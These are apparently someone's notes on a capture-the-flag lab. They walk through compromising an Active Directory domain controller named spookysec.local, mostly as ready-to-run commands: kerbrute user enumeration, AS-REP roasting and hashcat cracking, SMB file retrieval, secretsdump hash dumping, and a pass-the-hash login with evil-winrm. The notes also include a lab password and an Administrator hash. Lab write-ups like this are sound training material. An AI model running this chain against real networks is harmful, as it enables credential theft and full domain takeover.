export ip=10.10.108.165

# Recon and Scanning

## nmap
- `sudo nmap -sC -sV -oG nmap.log -O $ip`

## kerbrute
- `kerbrute userenum --dc spookysec.local -d spookysec.local /usr/share/wordlists/rockyou.txt`
  - need to set `spookysec.local` entry in the `/etc/hosts` file.
- `python3 /opt/impacket/examples/GetNPUsers.py -format hashcat -outputfile impacket.hashes -usersfile users.txt spookysec.local/`
  - to get the password hash for the user svc-admin
- `hashcat -m 18200 -a 0 impacket.hashes rockyou.txt`
  - we get the password

## smbclient
- `smbclient -L=spookysec.local`
  - Use the username and the password we got by cracking the hash
- `smbclient -U spookysec.local/svc-admin //spookysec.local/backup`
  - enter the password
  - `get backup_credentials.txt` to download the file 
    - decode it using `base64 -d` to get the user name and password for backup account

## impacket
- using this new username and password to login
  - `python3 /opt/impacket/examples/secretsdump.py -dc-ip $ip spookysec.local/backup:backup2517860@$ip`
    - this will get us all the hashes of the users in the active directory

## evil-winrm
- Trying to login into windoes using username and hash
  - `evil-winrm -i $ip -u Administrator -H 0e0363213e37b94221497260b0bcb4fc`
  - If we go to the users Desktop, we can see the root.txt flag
  - we can go to all the other users' desktops to get the remaining flags